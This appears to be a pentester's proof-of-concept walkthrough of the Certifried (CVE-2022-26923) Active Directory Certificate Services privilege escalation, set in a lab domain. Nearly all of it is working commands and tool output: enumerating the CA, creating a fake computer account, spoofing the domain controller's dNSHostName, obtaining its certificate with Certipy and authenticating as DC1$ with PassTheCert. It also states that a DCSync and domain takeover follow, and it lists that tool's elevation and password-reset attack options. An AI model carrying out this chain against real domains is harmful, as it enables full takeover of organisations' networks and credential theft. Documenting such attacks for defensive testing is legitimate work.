=============================================================================================================================================
Certifried exploit (CVE-2022-26923)
=============================================================================================================================================

> Certifried (CVE-2022-26923) is a vulnerability discovered by Oliver Lyak on Active Directory Certificate Services (ADCS) that allows a 
  domain-joined user to escalate its privileges in the domain.
> An authenticated low-privileged user can manipulate attributes on computer accounts they own or manage, and acquire a certificate from 
  Active Directory Certificate Services (ADCS) that would lead to privilege escalation and Domain take over.

Tools used for the PoC
-----------------------
> PowerShell Active Directory Module / Remote Server Administration Tools - https://www.microsoft.com/en-us/download/details.aspx?id=45520 
> Powermad.ps1 - https://github.com/Kevin-Robertson/Powermad
> Certify.exe - https://github.com/GhostPack/Certify
> Certipy.py - https://github.com/ly4k/Certipy
> PassTheCert.exe - https://github.com/AlmondOffSec/PassTheCert

Usefull links
--------------
> https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4
> https://github.com/ShutdownRepo/The-Hacker-Recipes/blob/master/ad/movement/ad-cs/certifried.md#conducting-the-attack


-----------------------------------------------------------------------------------------------------------------------------------------
PoC - Step 1 - Collect information about the Active Directory Certificate Services (ADCS) and check if the 'Certifried' vulnerability has 
               been patched using a low-privileged Windows domain account and the tools certutil, certify.exe and Certipy.py
-----------------------------------------------------------------------------------------------------------------------------------------

C:\temp> certutil
Entry 0:
  Name:                         `company-DC1-CA'
  Organizational Unit:          `'
  Organization:                 `'
  Locality:                     `'
  State:                        `'
  Country/region:               `'
  Config:                       `DC1.company.work\company-DC1-CA'
  Exchange Certificate:         `'
  Signature Certificate:        `'
  Description:                  `'
  Server:                       `DC1.company.work'
  Authority:                    `company-DC1-CA'
  Sanitized Name:               `company-DC1-CA'
  Short Name:                   `company-DC1-CA'
  Sanitized Short Name:         `company-DC1-CA'
  Flags:                        `1'
  Web Enrollment Servers:
1
2
0
https://dc1.company.work/company-DC1-CA_CES_Kerberos/service.svc/CES
0
CertUtil: -dump command completed successfully.


C:\temp>Certify.exe cas /domain:company.work /ldapserver:dc1.company.work /path:CN=Configuration,DC=company,DC=work /showAllPermissions
   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate authorities
[*] Using the search base 'CN=Configuration,DC=company,DC=work'

[*] Root CAs

    Cert SubjectName              : CN=company-DC1-CA, DC=company, DC=work
    Cert Thumbprint               : F36FAF68E3E14EE6E4A2F4246242D0516D93EBF8
    Cert Serial                   : 244D90F514123BB24E56C0272D6EF900
    Cert Start Date               : 1/7/2023 1:26:54 PM
    Cert End Date                 : 1/7/2028 1:36:53 PM
    Cert Chain                    : CN=company-DC1-CA,DC=company,DC=work

[*] NTAuthCertificates - Certificates that enable authentication:

    Cert SubjectName              : CN=company-DC1-CA, DC=company, DC=work
    Cert Thumbprint               : F36FAF68E3E14EE6E4A2F4246242D0516D93EBF8
    Cert Serial                   : 244D90F514123BB24E56C0272D6EF900
    Cert Start Date               : 1/7/2023 1:26:54 PM
    Cert End Date                 : 1/7/2028 1:36:53 PM
    Cert Chain                    : CN=company-DC1-CA,DC=company,DC=work

[*] Enterprise/Enrollment CAs:

    Enterprise CA Name            : company-DC1-CA
    DNS Hostname                  : DC1.company.work
    FullName                      : DC1.company.work\company-DC1-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=company-DC1-CA, DC=company, DC=work
    Cert Thumbprint               : F36FAF68E3E14EE6E4A2F4246242D0516D93EBF8
    Cert Serial                   : 244D90F514123BB24E56C0272D6EF900
    Cert Start Date               : 1/7/2023 1:26:54 PM
    Cert End Date                 : 1/7/2028 1:36:53 PM
    Cert Chain                    : CN=company-DC1-CA,DC=company,DC=work
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Identity                    : NT AUTHORITY\Authenticated UsersS-1-5-11
        AccessControlType         : Allow
        Rights                    : Enroll
        ObjectType                : 00000000-0000-0000-0000-000000000000
        IsInherited               : False
        InheritedObjectType       : 00000000-0000-0000-0000-000000000000
        InheritanceFlags          : ContainerInherit, ObjectInherit
        PropagationFlags          : None
      Identity                    : BUILTIN\Administrators        S-1-5-32-544
        AccessControlType         : Allow
        Rights                    : ManageCA, ManageCertificates
        ObjectType                : 00000000-0000-0000-0000-000000000000
        IsInherited               : False
        InheritedObjectType       : 00000000-0000-0000-0000-000000000000
        InheritanceFlags          : ContainerInherit, ObjectInherit
        PropagationFlags          : None
      Identity                    : COMPANY\Domain Admins         S-1-5-21-844310393-2305947092-3799914435-512
        AccessControlType         : Allow
        Rights                    : ManageCA, ManageCertificates
        ObjectType                : 00000000-0000-0000-0000-000000000000
        IsInherited               : False
        InheritedObjectType       : 00000000-0000-0000-0000-000000000000
        InheritanceFlags          : ContainerInherit, ObjectInherit
        PropagationFlags          : None
      Identity                    : COMPANY\Enterprise Admins     S-1-5-21-844310393-2305947092-3799914435-519
        AccessControlType         : Allow
        Rights                    : ManageCA, ManageCertificates
        ObjectType                : 00000000-0000-0000-0000-000000000000
        IsInherited               : False
        InheritedObjectType       : 00000000-0000-0000-0000-000000000000
        InheritanceFlags          : ContainerInherit, ObjectInherit
        PropagationFlags          : None
    Enrollment Agent Restrictions : None

    Enabled Certificate Templates:
        DirectoryEmailReplication
        DomainControllerAuthentication
        KerberosAuthentication
        EFSRecovery
        EFS
        DomainController
        WebServer
        Machine
        User
        SubCA
        Administrator

Certify completed in 00:00:18.1508451


NOTEs
-------
=> Requesting a certificate based on the Machine (or User) template can indicate whether the patch has been applied or not. 
   If the certificate object contains an SID (objectSid), then the patch has been applied.
=> We collect a certificate for our standard domain user account 'lowprivuser' (using 'certipy.py') and the mention "Certificate has no 
   object SID" tells us that the environment is prone to the certifried flaw.

jeff@kali:~/.local/bin$ python3 ./certipy req -u 'lowprivuser@company.work' -p SuperPassword -dc-ip 192.168.1.167 -target 192.168.1.167 -ca company-dc1-ca -debug
Certipy v4.3.0 - by Oliver Lyak (ly4k)

[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:192.168.1.167[\pipe\cert]
[+] Connected to endpoint: ncacn_np:192.168.1.167[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 9
[*] Got certificate with UPN 'lowprivuser@company.work'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'lowprivuser.pfx'

jeff@kali:~/.local/bin$ ls -al lowprivuser.pfx
-rw-r--r-- 1 jeff jeff 3055 Jan 10 02:22 lowprivuser.pfx


-----------------------------------------------------------------------------------------------------------------------------------------
PoC - Step 2 -  Check the 'ms-DS-MachineAccountQuota' and create a fake computer account using the using the PowerShell Active Directory 
                module and the tool Powermad.ps1
-----------------------------------------------------------------------------------------------------------------------------------------

PS C:\temp\> cd ADModule-master
PS C:\temp\ADModule-master> ls

    Directory: C:\temp\ADModule-master

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        1/10/2023   3:23 AM                ActiveDirectory
d-----        1/10/2023   3:23 AM                img
-a----        11/5/2018  12:04 AM        1127936 Microsoft.ActiveDirectory.Management.dll
-a----        11/5/2018  12:04 AM           1485 README.md

PS C:\temp\ADModule-master> import-module .\Microsoft.ActiveDirectory.Management.dll
PS C:\temp\ADModule-master> import-module .\ActiveDirectory\ActiveDirectory.psd1

PS C:\temp\ADModule-master>
PS C:\temp\Powermad-master> cd ..

PS C:\temp> Get-ADObject ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota

DistinguishedName         : DC=company,DC=work
ms-DS-MachineAccountQuota : 10
Name                      : company
ObjectClass               : domainDNS
ObjectGUID                : ae4c6c22-324e-465e-9dbd-3eb3d93009ec


PS C:\temp> cd .\Powermad-master\

PS C:\temp\Powermad-master> . .\Powermad.ps1

PS C:\temp\Powermad-master> New-MachineAccount -MachineAccount FakeComputer -Password $(ConvertTo-SecureString 'Welcome2
022' -AsPlainText -Force) -Verbose
VERBOSE: [+] Domain Controller = DC1.company.work
VERBOSE: [+] Domain = company.work
VERBOSE: [+] SAMAccountName = FakeComputer$
VERBOSE: [+] Distinguished Name = CN=FakeComputer,CN=Computers,DC=company,DC=work
[+] Machine account FakeComputer added

PS C:\temp\Powermad-master>

PS C:\temp\Powermad-master> get-adcomputer FakeComputer

DistinguishedName : CN=FakeComputer,CN=Computers,DC=company,DC=work
DNSHostName       : FakeComputer.company.work
Enabled           : True
Name              : FakeComputer
ObjectClass       : computer
ObjectGUID        : 1519dfe8-a837-45eb-bece-c9420c4bafec
SamAccountName    : FakeComputer$
SID               : S-1-5-21-844310393-2305947092-3799914435-1178
UserPrincipalName :


---------------------------------------------------------------------------------------------------------------------------------------------
PoC - Step 3 - Clear the SPN of the fake computer account and set its dNSHostName value to the name of a Domain Controller (dc1.company.work)
         to impersonate using the PowerShell Active Directory module
---------------------------------------------------------------------------------------------------------------------------------------------

PS C:\temp> Set-ADComputer FakeComputer -ServicePrincipalName @{}

PS C:\temp> Set-ADComputer FakeComputer -DNSHostName dc1.company.work

PS C:\temp> get-adcomputer FakeComputer -Properties dnshostname,serviceprincipalname

DistinguishedName : CN=FakeComputer,CN=Computers,DC=company,DC=work
DNSHostName       : dc1.company.work
Enabled           : True
Name              : FakeComputer
ObjectClass       : computer
ObjectGUID        : 1519dfe8-a837-45eb-bece-c9420c4bafec
SamAccountName    : FakeComputer$
SID               : S-1-5-21-844310393-2305947092-3799914435-1178
UserPrincipalName :


------------------------------------------------------------------------------------------------------------------------------------
PoC - Step 4 - Get the certificate of the targeted machine account i.e. in this example the Domain Controller 'dc1.company.work'
               using the tool Certipy.py
------------------------------------------------------------------------------------------------------------------------------------

jeff@kali:~/.local/bin$ python3 ./certipy req -u 'FakeComputer$@company.work' -p Welcome2022 -dc-ip 192.168.1.167 -target 192.168.1.167
                                          -ca company-dc1-ca -debug -template Machine
Certipy v4.3.0 - by Oliver Lyak (ly4k)

[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:192.168.1.167[\pipe\cert]
[+] Connected to endpoint: ncacn_np:192.168.1.167[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 11
[*] Got certificate with DNS Host Name 'dc1.company.work'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'dc1.pfx'


-------------------------------------------------------------------------------------------------------------------------------------------
PoC - Step 5 - Use the certificate 'dc1.pfx' and the tool 'PassTheCert.exe' to log into the DC with the computer account 'dc1.company.work'
-------------------------------------------------------------------------------------------------------------------------------------------

PS C:\temp> .\PassTheCert.exe --cert-path ./dc1.pfx --whoami --target DC=company,DC=work --server 192.168.1.167

Querying LDAP As : u:COMPANY\DC1$


=> we can now do a DCsync attack and take full control over the Windows Domain "company.work" of my pentest lab !


Other commands of the tool 'PassTheCert.exe'
--------------------------------------------
PassTheCert.exe [--help] --server DOMAIN_CONTROLLER [--start-tls] --cert-path CERT_PATH [--cert-password CERT_PASSWORD] (--elevate|--rbcd|--add-computer|--reset-password) [ATTACK_OPTIONS]
GENERAL OPTIONS:
        --server DOMAIN_CONTROLLER
                Domain controller to connect to. By default, connection will be done over TCP/636 (LDAPS).
        --start-tls
                Indicates that connection should instead be done over TCP/389 (LDAP) and then use StartTLS.
        --cert-path CERT_PATH
                Path to the certificate to authenticate with.
        --cert-password CERT_PASSWORD
                Password to the certificate (Optional argument. Default value: <empty>).
ATTACK TYPE:
        --whoami
                Query LDAP whoami to check if strict validation is being checked
        --elevate
                Elevate the rights of a user on the domain. Will grant DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights.
        --rbcd
                Adds an SID to the msDS-AllowedToActOnBehalfOfOtherIdentity arttribute of the target.
        --add-computer
                Add a new computer to the domain (useful for RBCD attacks).
        --reset-password
                Reset the password of the targeted account (requires the User-Force-Change-Password right).

ELEVATE ATTACK OPTIONS: --target TARGET (--sid SID|--restore RESTORE_FILE)
        --target TARGET
                Target of the attack. Should be the distinguished name of the domain.
        --sid SID
                SID to elevate.
        --restore RESTORE_FILE
                File from which to restore the msDS-nTSecurityDescriptor attribute.
                You can use --restore clear to clear the attribute.
                
RBCD ATTACK OPTIONS: --target TARGET (--sid SID|--restore RESTORE_FILE)
        --target TARGET
                Target of the attack. Should be the distinguished name of the computer.
        --sid SID
                SID to grant RBCD rights to.
        --restore RESTORE_FILE
                File from which to restore the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.
                You can use --restore clear to clear the attribute.

ADD COMPUTER ATTACK OPTIONS: --computer-name COMPUTER_NAME [--computer-password COMPUTER_PASSWORD]
        --computer-name COMPUTER_NAME
                The name of the computer to add.
        --computer-password COMPUTER_PASSWORD
                The password of the new computer (Optional argument. Default value: <random value>).
                
RESET PASSWORD ATTACK OPTIONS: --target TARGET [--new-password NEW_PASSWORD]
        --target TARGET
                Target of the attack. Should be the distinguished name of the account.
        --new-password new_PASSWORD
                The new password of the account (Optional argument. Default value: <random value>).
